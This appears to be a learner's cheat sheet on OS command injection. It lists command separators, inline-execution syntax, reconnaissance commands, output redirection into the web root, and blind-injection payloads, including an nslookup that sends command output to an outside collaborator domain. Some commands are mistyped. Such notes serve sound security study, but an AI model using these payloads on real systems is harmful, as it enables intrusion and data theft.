os command injection

NOTE:-- understand the context in which it is used
eg --> it may be either parematers or some type of assignment to the command or any script

1) USEFUL COMMANDS:--->

Purpose of command 	    Linux 	       Windows
Name of current user 	  whoami 	       whoami
Operating system 	      uname -a 	     ver
Network configuration 	ifconfig 	     ipconfig /all
Network connections 	  netstat -an 	 netstat -an
Running processes 	    ps -ef 	       tasklist 
 
2)  Exploiting blind OS command injection by redirecting output
  & whoami > /var/www/static/whoami.txt &    ----> execute the comnamd to redirect output 
  https://vulnerable-website.com/whoami.txt     -----> then read the output if possible using file read

3)Ways of injecting OS commands
cmd separators for both win and linux --->

    &
    &&
    |
    ||
only for linux  --> 
    1  ---> ;
   2---->  Newline (0x0a or \n)
 On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

    `injected command ` ----> backtikcs
    $(injected command )


3) sometimes u need to either terminate with " or ' or start with ' or  "


NOTE----> separators at end should be used as sometimes they are used to separate whats comes after it thus executing code successfully

4)blind cmd exec:
i.using time delay -----> ping -c localhost
ii. using oast tehcnique ---> using nsllokup   ----> use nslookup collaboratordomain
if oast is found we ca use the followinf to get data  ----> nslokup `cmd`.collabdomain    or    nslookup $(cmd).domain
